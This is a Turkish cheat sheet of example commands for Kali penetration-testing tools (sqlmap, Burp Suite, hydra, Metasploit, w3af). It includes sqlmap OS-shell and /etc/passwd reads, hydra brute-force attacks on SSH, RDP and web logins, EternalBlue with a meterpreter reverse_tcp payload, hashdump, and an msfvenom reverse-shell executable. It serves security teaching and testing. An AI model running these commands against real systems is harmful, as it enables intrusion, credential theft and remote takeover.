# Kali Linux Web Penetrasyon Test Araçları ve Örnek Komutlar (Devam)

## 6. sqlmap

1. `sqlmap -u "http://example.com/page.php?id=1"` - Temel SQL enjeksiyon testi
2. `sqlmap -u "http://example.com/page.php?id=1" --dbs` - Veritabanlarını listele
3. `sqlmap -u "http://example.com/page.php?id=1" -D dbname --tables` - Belirli bir veritabanındaki tabloları listele
4. `sqlmap -u "http://example.com/page.php?id=1" -D dbname -T tablename --columns` - Belirli bir tablonun sütunlarını listele
5. `sqlmap -u "http://example.com/page.php?id=1" -D dbname -T tablename -C column1,column2 --dump` - Belirli sütunları dökümle
6. `sqlmap -u "http://example.com/page.php?id=1" --data "username=test&password=test"` - POST isteği ile test
7. `sqlmap -u "http://example.com/page.php?id=1" --cookie="PHPSESSID=1234abcd"` - Cookie kullanarak test
8. `sqlmap -u "http://example.com/page.php?id=1" --level 5 --risk 3` - Daha kapsamlı test yap
9. `sqlmap -u "http://example.com/page.php?id=1" --os-shell` - İşletim sistemi shell'i elde etmeye çalış
10. `sqlmap -u "http://example.com/page.php?id=1" --file-read="/etc/passwd"` - Dosya okumaya çalış
11. `sqlmap -u "http://example.com/page.php?id=1" --file-write="local.txt" --file-dest="/tmp/remote.txt"` - Dosya yüklemeye çalış
12. `sqlmap -u "http://example.com/page.php?id=1" --technique=U` - Sadece UNION tabanlı saldırıları dene
13. `sqlmap -u "http://example.com/page.php?id=1" --random-agent` - Rastgele user agent kullan
14. `sqlmap -u "http://example.com/page.php?id=1" --proxy="http://127.0.0.1:8080"` - Proxy kullan
15. `sqlmap -u "http://example.com/page.php?id=1" --tor` - Tor ağını kullan
16. `sqlmap -u "http://example.com/page.php?id=1" --wizard` - Interaktif sihirbaz modunu kullan
17. `sqlmap -u "http://example.com/page.php?id=1" --tamper=space2comment` - Tamper scripti kullan
18. `sqlmap -u "http://example.com/page.php?id=1" --batch` - Hiç soru sormadan otomatik olarak çalış
19. `sqlmap -r request.txt` - Kaydedilmiş HTTP isteğini kullan
20. `sqlmap -u "http://example.com/page.php?id=1" --threads=10` - Çoklu thread kullanarak hızlandır

## 7. burpsuite

Not: Burp Suite genellikle GUI ile kullanılır, ancak bazı CLI komutları da vardır. İşte bunlardan bazıları:

1. `java -jar burpsuite.jar` - Burp Suite'i başlat
2. `java -jar burpsuite.jar --project-file=myproject.burp` - Belirli bir proje dosyasını aç
3. `java -jar burpsuite.jar --config-file=myconfig.json` - Özel yapılandırma dosyası kullan
4. `java -jar burpsuite.jar --disable-extensions` - Eklentileri devre dışı bırakarak başlat
5. `java -jar burpsuite.jar --unpause-spider-and-scanner` - Spider ve Scanner'ı otomatik olarak başlat
6. `java -jar burpsuite.jar --user-config-file=myuserconfig.json` - Kullanıcı yapılandırma dosyası kullan
7. `java -jar burpsuite.jar --collaborator-server` - Collaborator sunucusunu başlat
8. `java -jar burpsuite.jar --collaborator-config=mycollab.properties` - Özel Collaborator yapılandırması kullan
9. `java -jar burpsuite.jar --headless` - Arayüzsüz modda çalıştır
10. `java -jar burpsuite.jar --project-file=myproject.burp --server` - Sunucu modunda çalıştır
11. `java -Xmx2G -jar burpsuite.jar` - Daha fazla bellek tahsis ederek başlat
12. `java -jar burpsuite.jar --verbose` - Ayrıntılı loglama ile başlat
13. `java -jar burpsuite.jar --help` - Yardım menüsünü göster
14. `java -jar burpsuite.jar --diagnostics` - Tanılama bilgilerini göster
15. `java -jar burpsuite.jar --use-defaults` - Varsayılan ayarları kullanarak başlat
16. `java -jar burpsuite.jar --config-file=myconfig.json --project-file=myproject.burp` - Özel yapılandırma ve proje dosyası kullan
17. `java -jar burpsuite.jar --temporary-project` - Geçici proje oluşturarak başlat
18. `java -jar burpsuite.jar --disable-auto-update` - Otomatik güncellemeleri devre dışı bırak
19. `java -jar burpsuite.jar --collaborator-server --collaborator-config=mycollab.properties` - Özel yapılandırma ile Collaborator sunucusu başlat
20. `java -Djava.awt.headless=true -jar burpsuite.jar` - Grafiksel arayüz olmadan çalıştır

## 8. hydra

1. `hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.1 http-post-form "/login.php:username=^USER^&password=^PASS^:Login failed"` - HTTP POST form brute force
2. `hydra -L users.txt -P passwords.txt ftp://192.168.1.1` - FTP brute force
3. `hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1` - SSH brute force
4. `hydra -L users.txt -P passwords.txt 192.168.1.1 mysql` - MySQL brute force
5. `hydra -l admin -P passwords.txt 192.168.1.1 smb` - SMB brute force
6. `hydra -L users.txt -P passwords.txt 192.168.1.1 telnet` - Telnet brute force
7. `hydra -l admin -P passwords.txt 192.168.1.1 https-form-post "/login:username=^USER^&password=^PASS^:F=Login failed"` - HTTPS form POST brute force
8. `hydra -l admin -P passwords.txt rdp://192.168.1.1` - RDP brute force
9. `hydra -L users.txt -P passwords.txt 192.168.1.1 pop3` - POP3 brute force
10. `hydra -l root -P passwords.txt 192.168.1.1 ssh -t 4` - 4 thread ile SSH brute force
11. `hydra -C default_accounts.txt 192.168.1.1 ftp` - FTP için varsayılan hesapları dene
12. `hydra -l admin -P passwords.txt 192.168.1.1 smtp` - SMTP brute force
13. `hydra -l root -P passwords.txt 192.168.1.1 ssh -s 2222` - Özel port üzerinden SSH brute force
14. `hydra -L users.txt -P passwords.txt 192.168.1.1 imap` - IMAP brute force
15. `hydra -l admin -P passwords.txt 192.168.1.1 vnc` - VNC brute force
16. `hydra -L users.txt -P passwords.txt 192.168.1.1 ldap2` - LDAP brute force
17. `hydra -l admin -P passwords.txt 192.168.1.1 http-proxy` - HTTP proxy brute force
18. `hydra -l root -P passwords.txt 192.168.1.1 ssh -e nsr` - SSH için ek şifre kombinasyonları dene
19. `hydra -L users.txt -P passwords.txt 192.168.1.1 socks5` - SOCKS5 proxy brute force
20. `hydra -l admin -P passwords.txt 192.168.1.1 http-get /admin` - HTTP GET brute force

## 9. metasploit

1. `msfconsole` - Metasploit Framework'ü başlat
2. `msfdb init` - Metasploit veritabanını başlat
3. `msfconsole -q` - Sessiz modda başlat
4. `use exploit/windows/smb/ms17_010_eternalblue` - Belirli bir exploit'i kullan
5. `show options` - Mevcut modülün seçeneklerini göster
6. `set RHOSTS 192.168.1.1` - Hedef IP adresini ayarla
7. `set PAYLOAD windows/meterpreter/reverse_tcp` - Payload'ı ayarla
8. `set LHOST 192.168.1.100` - Yerel IP adresini ayarla
9. `exploit` - Exploit'i çalıştır
10. `search ms17-010` - Belirli bir açık için modül ara
11. `info` - Mevcut modül hakkında bilgi göster
12. `back` - Önceki menüye dön
13. `sessions` - Aktif oturumları listele
14. `sessions -i 1` - Belirli bir oturuma geç
15. `run post/windows/gather/hashdump` - Windows hash'lerini topla
16. `run post/linux/gather/hashdump` - Linux hash'lerini topla
17. `db_nmap -sV 192.168.1.1` - Nmap taraması yapıp sonuçları veritabanına kaydet
18. `workspace -a myproject` - Yeni bir çalışma alanı oluştur
19. `load sqlmap` - SQLMap eklentisini yükle
20. `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > payload.exe` - Özel payload oluştur

## 10. w3af

1. `w3af_console` - w3af'ı konsol modunda başlat
2. `w3af>>> plugins` - Eklenti menüsüne gir
3. `w3af/plugins>>> list audit` - Denetim eklentilerini listele
4. `w3af/plugins>>> list crawl` - Crawl eklentilerini listele
5. `w3af/plugins>>> enable all` - Tüm eklentileri etkinleştir
6. `w3af/plugins>>> back` - Ana menüye dön
7. `w3af>>> target` - Hedef ayarları menüsüne gir
8. `w3af/config:target>>> set target http://example.com/` - Hedef URL'yi ayarla
9. `w3af/config:target>>> back` - Ana menüye dön
10. `w3af>>> start` - Taramayı başlat
11. `w3af>>> kb` - Bilgi tabanını göster
12. `w3af>>> exploit` - Exploit menüsüne gir
13. `w3af/exploit>>> list` - Kullanılabilir exploit'leri listele
14. `w3af/exploit>>> exploit os_commanding` - Belirli bir exploit'i çalıştır
15. `w3af>>> profiles` - Profil menüsüne gir
16. `w3af/profiles>>> use fast_scan` - Hızlı tarama profilini kullan
17. `w3af>>> set http-settings timeout 30` - HTTP zaman aşımı süresini ayarla
18. `w3af>>> save_config my_config.pw3af` - Mevcut yapılandırmayı kaydet
19. `w3af>>> load_config my_config.pw3af` - Kaydedilmiş yapılandırmayı yükle
20. `w3af>>> exit` - w3af'tan çık

Bu komutlar, bu beş güçlü penetrasyon test aracının temel kullanımını kapsar. Her aracın daha fazla özelliği ve parametresi olduğunu unutmayın. İhtiyacınıza göre man sayfalarını veya resmi dokümantasyonları inceleyerek daha fazla bilgi edinebilirsiniz.